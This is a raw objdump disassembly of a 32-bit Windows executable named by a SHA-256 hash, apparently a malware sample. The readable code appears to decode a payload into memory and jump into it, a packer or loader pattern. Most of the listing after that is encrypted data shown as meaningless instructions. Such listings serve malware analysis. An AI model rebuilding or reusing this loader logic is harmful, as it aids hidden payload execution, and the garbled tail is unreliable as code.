
bced7bcc1265b5d995de652723c103112f30dd174b03f599f53ee4eac9b7bb55.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	sub    esp,0xf8
  411006:	push   esi
  411007:	mov    esi,DWORD PTR ds:0x42901c
  41100d:	push   edi
  41100e:	push   0x0
  411010:	push   0x80
  411015:	push   0x3
  411017:	push   0x0
  411019:	push   0x0
  41101b:	push   0x80000000
  411020:	push   0x4291e8
  411025:	call   esi
  411027:	mov    edi,eax
  411029:	cmp    edi,0xffffffff
  41102c:	mov    DWORD PTR [esp+0xc],edi
  411030:	je     0x41115f
  411036:	push   0x0
  411038:	push   0x80
  41103d:	push   0x4
  41103f:	push   0x0
  411041:	push   0x1
  411043:	push   0x4
  411045:	push   0x4291e0
  41104a:	call   esi
  41104c:	mov    esi,eax
  41104e:	cmp    esi,0xffffffff
  411051:	jne    0x411061
  411053:	pop    edi
  411054:	mov    eax,0x1
  411059:	pop    esi
  41105a:	add    esp,0xf8
  411060:	ret    
  411061:	push   ebx
  411062:	mov    ebx,DWORD PTR ds:0x429018
  411068:	push   ebp
  411069:	mov    ebp,DWORD PTR ds:0x429014
  41106f:	nop
  411070:	push   0x0
  411072:	lea    eax,[esp+0x14]
  411076:	push   eax
  411077:	push   0xc8
  41107c:	lea    ecx,[esp+0x4c]
  411080:	push   ecx
  411081:	push   edi
  411082:	call   DWORD PTR ds:0x429010
  411088:	test   eax,eax
  41108a:	je     0x4110d1
  41108c:	push   0x2
  41108e:	push   0x0
  411090:	push   0x0
  411092:	push   esi
  411093:	call   ebx
  411095:	mov    edx,DWORD PTR [esp+0x10]
  411099:	push   0x0
  41109b:	push   edx
  41109c:	push   0x0
  41109e:	mov    edi,eax
  4110a0:	push   edi
  4110a1:	push   esi
  4110a2:	call   ebp
  4110a4:	mov    ecx,DWORD PTR [esp+0x10]
  4110a8:	push   0x0
  4110aa:	lea    eax,[esp+0x1c]
  4110ae:	push   eax
  4110af:	push   ecx
  4110b0:	lea    edx,[esp+0x4c]
  4110b4:	push   edx
  4110b5:	push   esi
  4110b6:	call   DWORD PTR ds:0x42902c
  4110bc:	mov    eax,DWORD PTR [esp+0x10]
  4110c0:	push   0x0
  4110c2:	push   eax
  4110c3:	push   0x0
  4110c5:	push   edi
  4110c6:	push   esi
  4110c7:	call   DWORD PTR ds:0x429040
  4110cd:	mov    edi,DWORD PTR [esp+0x14]
  4110d1:	cmp    DWORD PTR [esp+0x10],0xc8
  4110d9:	je     0x411070
  4110db:	push   edi
  4110dc:	mov    edi,DWORD PTR ds:0x429044
  4110e2:	call   edi
  4110e4:	push   esi
  4110e5:	call   edi
  4110e7:	lea    ecx,[esp+0x1c]
  4110eb:	push   ecx
  4110ec:	call   DWORD PTR ds:0x42904c
  4110f2:	mov    ecx,DWORD PTR [esp+0x38]
  4110f6:	xor    edx,edx
  4110f8:	mov    eax,0x21c00
  4110fd:	div    ecx
  4110ff:	mov    edi,DWORD PTR ds:0x42911c
  411105:	lea    edx,[esp+0x40]
  411109:	mov    ebx,ecx
  41110b:	mov    esi,eax
  41110d:	imul   esi,ecx
  411110:	push   esi
  411111:	push   0x4291a8
  411116:	push   edx
  411117:	call   edi
  411119:	xor    edx,edx
  41111b:	mov    eax,0x21c00
  411120:	div    ebx
  411122:	lea    eax,[esp+0x4c]
  411126:	add    edx,0x400
  41112c:	push   edx
  41112d:	push   0x429180
  411132:	push   eax
  411133:	call   edi
  411135:	push   0x22000
  41113a:	lea    ecx,[esp+0x5c]
  41113e:	push   0x429150
  411143:	push   ecx
  411144:	call   edi
  411146:	mov    edx,0x21c00
  41114b:	sub    edx,esi
  41114d:	push   edx
  41114e:	lea    eax,[esp+0x68]
  411152:	push   0x429128
  411157:	push   eax
  411158:	call   edi
  41115a:	add    esp,0x30
  41115d:	pop    ebp
  41115e:	pop    ebx
  41115f:	pop    edi
  411160:	xor    eax,eax
  411162:	pop    esi
  411163:	add    esp,0xf8
  411169:	ret    
  41116a:	nop
  41116b:	nop
  41116c:	nop
  41116d:	nop
  41116e:	nop
  41116f:	nop
  411170:	sub    esp,0x8
  411173:	push   ebx
  411174:	push   ebp
  411175:	mov    ebp,DWORD PTR [esp+0x20]
  411179:	push   esi
  41117a:	xor    eax,eax
  41117c:	push   edi
  41117d:	mov    edi,DWORD PTR [esp+0x1c]
  411181:	mov    DWORD PTR [esp+0x10],eax
  411185:	mov    esi,0xfffffffd
  41118a:	mov    DWORD PTR [esp+0x14],0x1
  411192:	mov    ecx,DWORD PTR [esp+0x20]
  411196:	mov    cl,BYTE PTR [ecx+esi*1+0x3]
  41119a:	add    esi,0x2
  41119d:	inc    esi
  41119e:	mov    BYTE PTR [esi+edi*1],cl
  4111a1:	movzx  edx,BYTE PTR [eax+ebp*1]
  4111a5:	mov    eax,DWORD PTR [esp+0x10]
  4111a9:	mov    ecx,DWORD PTR [esp+0x14]
  4111ad:	add    eax,ecx
  4111af:	mov    DWORD PTR [esp+0x10],eax
  4111b3:	shr    eax,cl
  4111b5:	mov    eax,DWORD PTR [esp+0x10]
  4111b9:	mov    ecx,eax
  4111bb:	shr    ecx,0x3
  4111be:	mov    ebx,0x1
  4111c3:	sub    ebx,ecx
  4111c5:	imul   eax,ebx
  4111c8:	mov    DWORD PTR [esp+0x10],eax
  4111cc:	shl    ebx,0x3
  4111cf:	mov    bl,BYTE PTR [esi+edi*1]
  4111d2:	mov    ecx,DWORD PTR [esp+0x24]
  4111d6:	add    bl,dl
  4111d8:	mov    BYTE PTR [esi+edi*1],bl
  4111db:	sub    esi,0x2
  4111de:	cmp    esi,ecx
  4111e0:	jl     0x411192
  4111e2:	pop    edi
  4111e3:	pop    esi
  4111e4:	pop    ebp
  4111e5:	pop    ebx
  4111e6:	add    esp,0x8
  4111e9:	ret    
  4111ea:	nop
  4111eb:	nop
  4111ec:	nop
  4111ed:	nop
  4111ee:	nop
  4111ef:	nop
  4111f0:	push   ebp
  4111f1:	mov    ebp,esp
  4111f3:	sub    esp,0x70
  4111f6:	mov    DWORD PTR [ebp-0x48],0x0
  4111fd:	mov    DWORD PTR [ebp-0x18],0x0
  411204:	mov    DWORD PTR [ebp-0x70],0x0
  41120b:	mov    DWORD PTR [ebp-0x60],0x0
  411212:	mov    DWORD PTR [ebp-0x8],0x0
  411219:	mov    DWORD PTR [ebp-0x6c],0x0
  411220:	mov    DWORD PTR [ebp-0x68],0x0
  411227:	mov    DWORD PTR [ebp-0x14],0x0
  41122e:	mov    DWORD PTR [ebp-0x4c],0x0
  411235:	mov    DWORD PTR [ebp-0x10],0x0
  41123c:	mov    DWORD PTR [ebp-0x58],0x0
  411243:	mov    DWORD PTR [ebp-0x4],0x0
  41124a:	mov    DWORD PTR [ebp-0x5c],0x0
  411251:	mov    DWORD PTR [ebp-0x30],0x0
  411258:	mov    DWORD PTR [ebp-0x54],0x0
  41125f:	mov    DWORD PTR [ebp-0x2c],0x0
  411266:	mov    DWORD PTR [ebp-0x50],0x0
  41126d:	mov    DWORD PTR [ebp-0xc],0x0
  411274:	mov    eax,ds:0x429214
  411279:	mov    DWORD PTR [ebp-0x28],eax
  41127c:	mov    ecx,DWORD PTR ds:0x429218
  411282:	mov    DWORD PTR [ebp-0x24],ecx
  411285:	mov    edx,DWORD PTR ds:0x42921c
  41128b:	mov    DWORD PTR [ebp-0x20],edx
  41128e:	mov    al,ds:0x429220
  411293:	mov    BYTE PTR [ebp-0x1c],al
  411296:	mov    ecx,DWORD PTR ds:0x429204
  41129c:	mov    DWORD PTR [ebp-0x40],ecx
  41129f:	mov    edx,DWORD PTR ds:0x429208
  4112a5:	mov    DWORD PTR [ebp-0x3c],edx
  4112a8:	mov    eax,ds:0x42920c
  4112ad:	mov    DWORD PTR [ebp-0x38],eax
  4112b0:	mov    cx,WORD PTR ds:0x429210
  4112b7:	mov    WORD PTR [ebp-0x34],cx
  4112bb:	mov    dl,BYTE PTR ds:0x429212
  4112c1:	mov    BYTE PTR [ebp-0x32],dl
  4112c4:	mov    DWORD PTR [ebp-0x30],0x40
  4112cb:	lea    eax,[ebp-0x10]
  4112ce:	push   eax
  4112cf:	push   0x4291f0
  4112d4:	call   DWORD PTR ds:0x429008
  4112da:	test   eax,eax
  4112dc:	je     0x411338
  4112de:	lea    ecx,[ebp-0x40]
  4112e1:	push   ecx
  4112e2:	lea    edx,[ebp-0x10]
  4112e5:	push   edx
  4112e6:	call   DWORD PTR ds:0x429000
  4112ec:	test   eax,eax
  4112ee:	je     0x411338
  4112f0:	push   0x0
  4112f2:	push   0x0
  4112f4:	push   0x0
  4112f6:	call   DWORD PTR ds:0x429034
  4112fc:	mov    DWORD PTR [ebp-0x14],eax
  4112ff:	mov    eax,DWORD PTR [ebp-0x10]
  411302:	add    eax,0x1
  411305:	mov    DWORD PTR [ebp-0x10],eax
  411308:	push   0x14
  41130a:	push   0x0
  41130c:	mov    ecx,DWORD PTR [ebp-0x14]
  41130f:	push   ecx
  411310:	call   DWORD PTR ds:0x429030
  411316:	lea    edx,[ebp-0x50]
  411319:	push   edx
  41131a:	push   0x0
  41131c:	push   0x0
  41131e:	push   0x0
  411320:	mov    eax,DWORD PTR [ebp-0x50]
  411323:	push   eax
  411324:	call   DWORD PTR ds:0x429004
  41132a:	push   0x0
  41132c:	push   0x0
  41132e:	mov    ecx,DWORD PTR [ebp-0x14]
  411331:	push   ecx
  411332:	call   DWORD PTR ds:0x429048
  411338:	call   DWORD PTR ds:0x429028
  41133e:	mov    DWORD PTR [ebp-0x2c],eax
  411341:	movzx  edx,WORD PTR [ebp-0x2c]
  411345:	cmp    edx,0x539
  41134b:	jne    0x41137c
  41134d:	mov    DWORD PTR [ebp-0x14],0xe0d
  411354:	lea    eax,[ebp-0x28]
  411357:	push   eax
  411358:	call   DWORD PTR ds:0x429024
  41135e:	mov    DWORD PTR [ebp-0x60],eax
  411361:	mov    DWORD PTR [ebp-0x54],0x3a
  411368:	mov    BYTE PTR [ebp-0x34],0x0
  41136c:	mov    DWORD PTR [ebp-0x8],0xb21671b4
  411373:	mov    DWORD PTR [ebp-0x68],0x10d93f
  41137a:	jmp    0x411391
  41137c:	mov    BYTE PTR ds:0x444a58,0x0
  411383:	mov    BYTE PTR ds:0x42cb88,0x0
  41138a:	mov    BYTE PTR ds:0x442b18,0x0
  411391:	mov    DWORD PTR [ebp-0x2c],0x410000
  411398:	push   DWORD PTR ds:0x429024
  41139e:	pop    edx
  41139f:	mov    DWORD PTR [ebp-0x6c],edx
  4113a2:	lea    ecx,[ebp-0x40]
  4113a5:	push   ecx
  4113a6:	mov    edx,DWORD PTR [ebp-0x60]
  4113a9:	push   edx
  4113aa:	call   DWORD PTR ds:0x429020
  4113b0:	mov    DWORD PTR [ebp-0x44],eax
  4113b3:	push   DWORD PTR [ebp-0x30]
  4113b6:	push   0x1000
  4113bb:	mov    eax,DWORD PTR [ebp-0x14]
  4113be:	add    eax,0x23
  4113c1:	add    eax,0x23
  4113c4:	push   eax
  4113c5:	xor    eax,eax
  4113c7:	push   eax
  4113c8:	mov    ecx,DWORD PTR [ebp-0x44]
  4113cb:	call   ecx
  4113cd:	push   eax
  4113ce:	pop    ecx
  4113cf:	mov    DWORD PTR [ebp-0x4],ecx
  4113d2:	mov    eax,DWORD PTR [ebp-0x68]
  4113d5:	sub    eax,0xdae0b
  4113da:	mov    DWORD PTR [ebp-0x68],eax
  4113dd:	cmp    DWORD PTR [ebp-0x4],0x0
  4113e1:	jne    0x4113ea
  4113e3:	mov    BYTE PTR ds:0x442b18,0x0
  4113ea:	mov    ecx,DWORD PTR [ebp-0x4]
  4113ed:	add    ecx,DWORD PTR [ebp-0x14]
  4113f0:	mov    edx,DWORD PTR [ebp-0x8]
  4113f3:	mov    DWORD PTR [ecx],edx
  4113f5:	mov    eax,DWORD PTR [ebp-0x4]
  4113f8:	add    eax,DWORD PTR [ebp-0x54]
  4113fb:	mov    DWORD PTR [ebp-0x5c],eax
  4113fe:	mov    ecx,DWORD PTR ds:0x429020
  411404:	mov    DWORD PTR [ebp-0x4c],ecx
  411407:	mov    edx,DWORD PTR [ebp-0x4]
  41140a:	add    edx,DWORD PTR [ebp-0x14]
  41140d:	mov    eax,DWORD PTR [ebp+0x8]
  411410:	mov    DWORD PTR [edx+0x4],eax
  411413:	mov    ecx,DWORD PTR [ebp-0x4]
  411416:	add    ecx,DWORD PTR [ebp-0x14]
  411419:	mov    DWORD PTR [ebp-0xc],ecx
  41141c:	cmp    DWORD PTR [ebp-0x68],0x0
  411420:	jbe    0x41143d
  411422:	mov    edx,DWORD PTR [ebp-0xc]
  411425:	push   edx
  411426:	mov    eax,DWORD PTR [ebp-0x14]
  411429:	push   eax
  41142a:	mov    ecx,DWORD PTR [ebp-0x2c]
  41142d:	add    ecx,DWORD PTR [ebp-0x68]
  411430:	push   ecx
  411431:	mov    edx,DWORD PTR [ebp-0x4]
  411434:	push   edx
  411435:	call   0x411170
  41143a:	add    esp,0x10
  41143d:	cmp    DWORD PTR [ebp-0x5c],0x0
  411441:	je     0x411454
  411443:	push   DWORD PTR [ebp-0x4c]
  411446:	push   DWORD PTR [ebp-0x6c]
  411449:	mov    edx,DWORD PTR [ebp-0x5c]
  41144c:	push   eax
  41144d:	jmp    edx
  41144f:	jmp    0x422f29
  411454:	mov    eax,DWORD PTR [ebp+0x8]
  411457:	mov    DWORD PTR [ebp-0x18],eax
  41145a:	mov    al,0x57
  41145c:	mov    dl,0x96
  41145e:	pushf  
  41145f:	rcl    cl,1
  411461:	out    0x50,al
  411463:	cld    
  411464:	mov    ecx,0x9f3700ed
  411469:	mov    ebx,0x29aacd6d
  41146e:	jge    0x4114ea
  411470:	neg    BYTE PTR [ecx-0x1a]
  411473:	test   DWORD PTR [ecx+ebx*8+0x6b35e261],ebp
  41147a:	xor    al,0xbd
  41147c:	add    dl,BYTE PTR [ebx-0x23]
  41147f:	ja     0x4114fb
  411481:	jae    0x41142b
  411483:	dec    eax
  411484:	inc    ecx
  411485:	xor    DWORD PTR [ebx+edx*2],edi
  411488:	mov    edx,0x85f4237d
  41148d:	and    BYTE PTR [edi+0x330e03f5],al
  411493:	retf   0x88a
  411496:	fadd   st(2),st
  411498:	ret    0xa51b
  41149b:	(bad)  
  41149c:	xor    eax,0x2dc23652
  4114a1:	adc    eax,0xd4c0820a
  4114a6:	neg    BYTE PTR [edi+0x1b]
  4114a9:	pop    ebp
  4114aa:	add    eax,edx
  4114ac:	cmp    al,0x23
  4114ae:	test   BYTE PTR [edx+0x1b580fc8],bh
  4114b4:	mov    DWORD PTR [ebp+ebx*4+0x55738dda],ebp
  4114bb:	popf   
  4114bc:	stos   BYTE PTR es:[edi],al
  4114bd:	sub    BYTE PTR ds:0x20dfa5de,0x0
  4114c4:	jmp    0x9afd:0xe714feda
  4114cb:	sub    BYTE PTR [edi+0x18],bl
  4114ce:	mov    ah,0x1a
  4114d0:	cmp    dl,BYTE PTR [edi]
  4114d2:	js     0x411490
  4114d4:	sbb    DWORD PTR [edx],0xffffffe1
  4114d7:	fst    DWORD PTR ds:[ebp-0xec00004]
  4114de:	push   es
  4114df:	cmp    DWORD PTR [ebx],esi
  4114e1:	dec    eax
  4114e2:	daa    
  4114e3:	test   DWORD PTR [edx],ebx
  4114e5:	or     al,0x8
  4114e7:	into   
  4114e8:	xor    bl,ch
  4114ea:	mov    al,ds:0xd820c3a2
  4114ef:	cmp    ebp,ebp
  4114f1:	inc    eax
  4114f2:	push   0xffffffa8
  4114f4:	and    bl,BYTE PTR [eax+0x27a49948]
  4114fa:	sbb    bl,BYTE PTR [eax]
  4114fc:	add    BYTE PTR [ebx-0x66],bh
  4114ff:	in     eax,dx
  411500:	mov    ds:0x762561f4,eax
  411505:	sbb    DWORD PTR [eax+eax*2+0x3d],edi
  411509:	fs push ebx
  41150b:	jne    0x411529
  41150d:	test   BYTE PTR [edi+ebp*8-0x5b76d6a],ch
  411514:	loopne 0x4114b7
  411516:	pop    edi
  411517:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411518:	mov    esi,0x298ad50
  41151d:	jmp    0x41153d
  41151f:	mov    dl,BYTE PTR [edi]
  411521:	imul   eax,DWORD PTR [edx+esi*1],0x4c
  411525:	shl    eax,cl
  411527:	cmp    al,0x29
  411529:	rol    ecx,cl
  41152b:	and    BYTE PTR [edx+0x5b],ah
  41152e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41152f:	outs   dx,DWORD PTR ds:[esi]
  411530:	mov    WORD PTR [esi+0x7e8eea20],cs
  411536:	call   0x91db:0x7672d37d
  41153d:	xchg   esp,eax
  41153e:	push   esi
  41153f:	add    al,BYTE PTR [ebx+0x73ba9d77]
  411545:	push   esp
  411546:	out    dx,eax
  411547:	adc    al,0x5
  411549:	addr16 push edi
  41154b:	imul   ecx,DWORD PTR [esi],0x9189a011
  411551:	pop    esp
  411552:	mov    ss,WORD PTR [edx-0x7680138a]
  411558:	jp     0x4114e0
  41155a:	dec    edx
  41155b:	jns    0x411552
  41155d:	jge    0x4114fb
  41155f:	out    dx,eax
  411560:	cmp    al,0x30
  411562:	xor    al,0xbd
  411564:	jae    0x411547
  411566:	xor    eax,0x983dd032
  41156b:	adc    al,0xe3
  41156d:	dec    esp
  41156e:	dec    ebx
  41156f:	jecxz  0x411554
  411571:	stos   DWORD PTR es:[edi],eax
  411572:	mov    dh,0xb
  411574:	es aas 
  411576:	jl     0x411508
  411578:	rcl    BYTE PTR [ebx],1
  41157a:	pop    ebp
  41157b:	(bad)  
  41157d:	rol    edi,0xf4
  411580:	mov    esp,0x204539db
  411585:	retf   0x71e2
  411588:	push   edi
  411589:	int3   
  41158a:	pop    ebp
  41158b:	mov    esp,0x64847109
  411590:	jp     0x411570
  411592:	pop    eax
  411593:	dec    esp
  411594:	cmp    al,0x35
  411596:	mov    es,WORD PTR [eax+0x14]
  411599:	jg     0x411529
  41159b:	or     BYTE PTR es:[eax+0xa],bl
  41159f:	cs mov al,0xf7
  4115a2:	retf   
  4115a3:	pop    ds
  4115a4:	cmp    bh,BYTE PTR [ebp-0x25]
  4115a7:	outs   dx,BYTE PTR ds:[esi]
  4115a8:	into   
  4115a9:	aam    0xdb
  4115ab:	mov    ds:0x66d02220,eax
  4115b0:	push   ds
  4115b1:	mov    ch,0x5a
  4115b3:	mov    eax,DWORD PTR [edx*1+0x2d80d4ba]
  4115ba:	fadd   st(6),st
  4115bc:	sub    eax,DWORD PTR [ecx-0x4f]
  4115bf:	aad    0x2a
  4115c1:	pop    ecx
  4115c2:	pop    es
  4115c3:	mov    ebx,0xd5970550
  4115c8:	dec    esp
  4115c9:	sbb    DWORD PTR [edx],ebx
  4115cb:	iret   
  4115cc:	stos   DWORD PTR es:[edi],eax
  4115cd:	(bad)  
  4115ce:	ds das 
  4115d0:	push   ebx
  4115d1:	in     eax,0x7e
  4115d3:	ret    
  4115d4:	xchg   ecx,eax
  4115d5:	pop    esp
  4115d6:	adc    al,0x69
  4115d8:	outs   dx,DWORD PTR ds:[esi]
  4115d9:	pop    edi
  4115da:	lea    esp,[ecx-0x7]
  4115dd:	jle    0x4115ca
  4115df:	xchg   ebx,eax
  4115e0:	mov    al,ds:0xc0e2ca9b
  4115e5:	lock sahf 
  4115e7:	aad    0xc
  4115e9:	mov    al,0x43
  4115eb:	adc    BYTE PTR [esi-0x15],bh
  4115ee:	std    
  4115ef:	cld    
  4115f0:	(bad)  
  4115f1:	pop    eax
  4115f2:	arpl   WORD PTR ds:0x678e7fe0,si
  4115f8:	jne    0x411674
  4115fa:	rep lods eax,DWORD PTR ds:[esi]
  4115fc:	sahf   
  4115fd:	mov    bl,0xf9
  4115ff:	mov    edi,esi
  411601:	cli    
  411602:	adc    BYTE PTR [edx+0x7eab48da],ah
  411608:	xchg   bl,bl
  41160a:	or     edx,edi
  41160c:	(bad)  
  41160d:	call   0x814fae41
  411612:	add    eax,0x642c1862
  411617:	cmp    bh,BYTE PTR [edx]
  411619:	out    dx,eax
  41161a:	jo     0x41161b
  41161c:	dec    ebp
  41161d:	outs   dx,DWORD PTR ds:[esi]
  41161e:	std    
  41161f:	inc    edx
  411620:	xor    edi,DWORD PTR [ebp+0x2a]
  411623:	repnz out dx,eax
  411625:	add    DWORD PTR [ecx+0x5a6d1250],0x63d4c88d
  41162f:	into   
  411630:	stos   DWORD PTR es:[edi],eax
  411631:	sahf   
  411632:	jle    0x4116aa
  411634:	retf   
  411635:	add    eax,0xacaef7a3
  41163a:	fs and eax,0xca6e971d
  411640:	test   eax,ecx
  411642:	in     al,dx
  411643:	les    edi,FWORD PTR [esi-0x14]
  411646:	push   ss
  411647:	add    ah,BYTE PTR [ecx+0x6db068e1]
  41164d:	popf   
  41164e:	repnz inc esp
  411650:	imul   edi,ebp,0x67
  411653:	pop    ebx
  411654:	push   ebx
  411655:	fs hlt 
  411657:	jge    0x41169d
  411659:	pusha  
  41165a:	mov    ecx,0x29e3af6c
  41165f:	sbb    eax,0x463d19e8
  411664:	repnz les ebp,FWORD PTR [ecx-0x2c]
  411668:	dec    edi
  411669:	sbb    BYTE PTR [edx-0x1cfa121e],cl
  41166f:	jp     0x87b0cfa6
  411675:	rcl    BYTE PTR [edi-0x6b],1
  411678:	xchg   ecx,eax
  411679:	add    eax,DWORD PTR [esi-0x60]
  41167c:	and    BYTE PTR [ecx],ch
  41167e:	je     0x41163e
  411680:	aas    
  411681:	and    DWORD PTR [ebx],esi
  411683:	xchg   ebx,eax
  411684:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411685:	rol    DWORD PTR [di],cl
  411688:	dec    eax
  411689:	mov    eax,0xdb33298f
  41168e:	add    eax,0x8fd9a5f
  411693:	daa    
  411694:	into   
  411695:	test   esi,ebp
  411697:	out    dx,eax
  411698:	popa   
  411699:	cmp    bh,BYTE PTR [eax-0x49]
  41169c:	clc    
  41169d:	es nop
  41169f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116a0:	aam    0x66
  4116a2:	mov    bl,0x35
  4116a4:	scas   al,BYTE PTR es:[edi]
  4116a5:	xchg   esi,eax
  4116a6:	repnz mov bl,0x47
  4116a9:	push   edi
  4116aa:	mov    bl,0xc8
  4116ac:	inc    ebp
  4116ad:	shr    ebp,0xcd
  4116b0:	ret    0x55e4
  4116b3:	or     dh,0xa1
  4116b6:	and    dh,BYTE PTR [esi-0xb]
  4116b9:	push   ebp
  4116ba:	addr16 inc esp
  4116bc:	int    0x3
  4116be:	xchg   edi,eax
  4116bf:	in     eax,dx
  4116c0:	push   esp
  4116c1:	stos   DWORD PTR es:[edi],eax
  4116c2:	jle    0x411697
  4116c4:	pop    ss
  4116c5:	cmp    ebx,edi
  4116c7:	jmp    0x411729
  4116c9:	adc    BYTE PTR [ecx+eax*4],al
  4116cc:	das    
  4116cd:	xor    DWORD PTR [edi+0x5b],0x1e
  4116d1:	sbb    cl,BYTE PTR [eax]
  4116d3:	loope  0x4116ee
  4116d5:	jb     0x411752
  4116d7:	mov    edi,0xed30fd0e
  4116dc:	push   es
  4116dd:	or     ch,BYTE PTR [eax+0x6a]
  4116e0:	inc    esp
  4116e1:	cmp    al,BYTE PTR [edi+eax*2-0x25]
  4116e5:	aaa    
  4116e6:	jmp    0x889b:0xaf891d4f
  4116ed:	pop    es
  4116ee:	sub    ebx,ecx
  4116f0:	mov    fs,esp
  4116f2:	sub    DWORD PTR [edx+ebx*2],edi
  4116f5:	lds    eax,FWORD PTR [edi]
  4116f7:	cmp    eax,0x9045eaa6
  4116fc:	adc    edi,ecx
  4116fe:	aam    0xa4
  411700:	hlt    
  411701:	inc    esp
  411702:	fs xor dh,ah
  411705:	pop    ecx
  411706:	push   ecx
  411707:	rcl    bl,0xc8
  41170a:	scas   eax,DWORD PTR es:[edi]
  41170b:	aaa    
  41170c:	lods   al,BYTE PTR ds:[esi]
  41170d:	cwde   
  41170e:	clc    
  41170f:	push   cs
  411710:	fstp   st(7)
  411712:	pusha  
  411713:	jp     0x411772
  411715:	mov    bl,0x63
  411717:	sbb    BYTE PTR [ecx-0x6018aaeb],0x61
  41171e:	gs mov ebp,0x97271efa
  411724:	dec    ecx
  411725:	and    eax,0x5bc44a51
  41172a:	push   ds
  41172b:	(bad)  
  41172c:	std    
  41172d:	dec    ebp
  41172e:	(bad)  
  411730:	int3   
  411731:	add    BYTE PTR [ebx+edi*8-0x2c],dl
  411735:	lea    ebx,[esi+eiz*2+0x7c54b6cf]
  41173c:	cli    
  41173d:	push   cs
  41173e:	inc    edi
  41173f:	jno    0x41176c
  411741:	adc    bl,BYTE PTR [esi+0x2]
  411744:	add    dh,BYTE PTR [edx]
  411746:	in     al,0x57
  411748:	adc    DWORD PTR [eax+0x300974ec],0x38
  41174f:	popf   
  411750:	mov    ah,0xf6
  411752:	imul   ebx
  411754:	into   
  411755:	jnp    0x411734
  411757:	and    ch,BYTE PTR [edi]
  411759:	inc    BYTE PTR [ebx+0x5c]
  41175c:	xor    ebx,ecx
  41175e:	test   DWORD PTR [ebp-0x2499b172],0x29443c4d
  411768:	adc    eax,0x766fd57a
  41176d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41176e:	sar    ecx,cl
  411770:	fsub   QWORD PTR [ecx-0x4f65f80]
  411776:	shl    eax,1
  411778:	arpl   cx,bx
  41177a:	jne    0x411721
  41177c:	repnz mov ch,0x17
  41177f:	mov    ch,0x80
  411781:	jmp    0x2af5a4ad
  411786:	push   0x3636f894
  41178b:	aam    0xfa
  41178d:	loop   0x411718
  41178f:	inc    ecx
  411790:	pushf  
  411791:	add    al,0x1f
  411793:	adc    edi,esi
  411795:	sub    al,BYTE PTR [edi+eiz*4+0x1]
  411799:	in     al,dx
  41179a:	bound  ebp,QWORD PTR [ebp+0x6da7a03]
  4117a0:	stos   BYTE PTR es:[edi],al
  4117a1:	add    eax,0xf3c00359
  4117a6:	inc    ebx
  4117a7:	mov    edx,0x84b8a4bb
  4117ac:	fldln2 
  4117ae:	cld    
  4117af:	pop    esi
  4117b0:	fmul   st(3),st
  4117b2:	(bad)  
  4117b4:	scas   al,BYTE PTR es:[edi]
  4117b5:	lock push ecx
  4117b7:	imul   esi,DWORD PTR [edi-0x7f],0x55
  4117bb:	into   
  4117bc:	jmp    0x41176b
  4117be:	push   0x8f905715
  4117c3:	cs jne 0x411841
  4117c6:	mov    eax,ds:0x5fd6c33a
  4117cb:	or     bh,bl
  4117cd:	mov    ecx,edi
  4117cf:	aad    0xe5
  4117d1:	push   0xffffffb6
  4117d3:	push   esi
  4117d4:	fcom   DWORD PTR [ecx+esi*1+0x3290db0c]
  4117db:	cli    
  4117dc:	mov    edx,?
  4117de:	mov    ecx,0x57432240
  4117e3:	fs and al,0x60
  4117e6:	dec    esp
  4117e7:	imul   eax
  4117e9:	dec    ebp
  4117ea:	and    eax,0x91312604
  4117ef:	fldenv [ecx]
  4117f1:	mov    al,ds:0xccddad53
  4117f6:	mov    esp,0xdfecff2b
  4117fb:	sahf   
  4117fc:	mov    ebx,0x95ce5df8
  411801:	popa   
  411802:	push   es
  411803:	push   edx
  411804:	mov    edi,0xa4369ead
  411809:	fcomi  st,st(2)
  41180b:	cmp    al,0x98
  41180d:	mov    ah,0x5a
  41180f:	dec    edi
  411810:	xchg   esi,eax
  411811:	sahf   
  411812:	pop    ds
  411813:	push   esi
  411814:	test   al,0x18
  411816:	out    dx,al
  411817:	add    eax,0xf4db0843
  41181c:	shr    al,0x49
  41181f:	sub    BYTE PTR [edi+edx*4-0x40cfd3df],0x19
  411827:	jmp    0x591eb04
  41182c:	push   0x9e5dfec5
  411831:	mov    ds:0x30248c2b,eax
  411836:	mov    ah,0x74
  411838:	push   0xa2572099
  41183d:	addr16 int3 
  41183f:	int3   
  411840:	arpl   WORD PTR [ebp+0x1026806d],bx
  411846:	scas   al,BYTE PTR es:[edi]
  411847:	daa    
  411848:	and    eax,0xd2a353c9
  41184d:	es sbb eax,0x764e6fe2
  411853:	inc    edi
  411854:	aad    0x8e
  411856:	xor    BYTE PTR ds:0x5b69a897,al
  41185c:	jge    0x411846
  41185e:	lock add bh,BYTE PTR [eax-0x62]
  411862:	jns    0x411813
  411864:	sbb    dh,BYTE PTR [ebx]
  411866:	lods   al,BYTE PTR ds:[esi]
  411867:	mov    ecx,0xce3dd85f
  41186c:	call   DWORD PTR [ebp-0x2b]
  41186f:	gs adc eax,0xd17a7a00
  411875:	push   0x4d8da218
  41187a:	mov    dl,0xef
  41187c:	fistp  QWORD PTR [edx+0x38]
  41187f:	in     eax,0x90
  411881:	fistp  DWORD PTR [ebx]
  411883:	mov    ds:0x28a3d8b7,eax
  411888:	out    dx,al
  411889:	leave  
  41188a:	inc    eax
  41188b:	jns    0x411855
  41188d:	mov    WORD PTR [eax+ebp*8-0x18],es
  411891:	mov    al,ds:0x544a5fb6
  411896:	shr    BYTE PTR [ebp+0x4b],cl
  411899:	ds int3 
  41189b:	or     esi,DWORD PTR [ebx+ecx*4]
  41189e:	(bad)  
  41189f:	ficom  DWORD PTR [edi-0x759603b8]
  4118a5:	test   DWORD PTR [edx-0x4f41bc5a],ecx
  4118ab:	push   ebx
  4118ac:	push   0xffffffe7
  4118ae:	fidivr WORD PTR [eax+0x44]
  4118b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118b2:	mov    edx,0x26fde41
  4118b7:	rcr    BYTE PTR fs:[eax+0x66],cl
  4118bb:	xchg   ecx,eax
  4118bc:	adc    al,0xc6
  4118be:	push   0xffffffa7
  4118c0:	xchg   DWORD PTR [ebx+eax*4-0x6],eax
  4118c4:	mov    edi,0xc317e09d
  4118c9:	in     al,dx
  4118ca:	jecxz  0x411922
  4118cc:	sub    eax,0xfb8df648
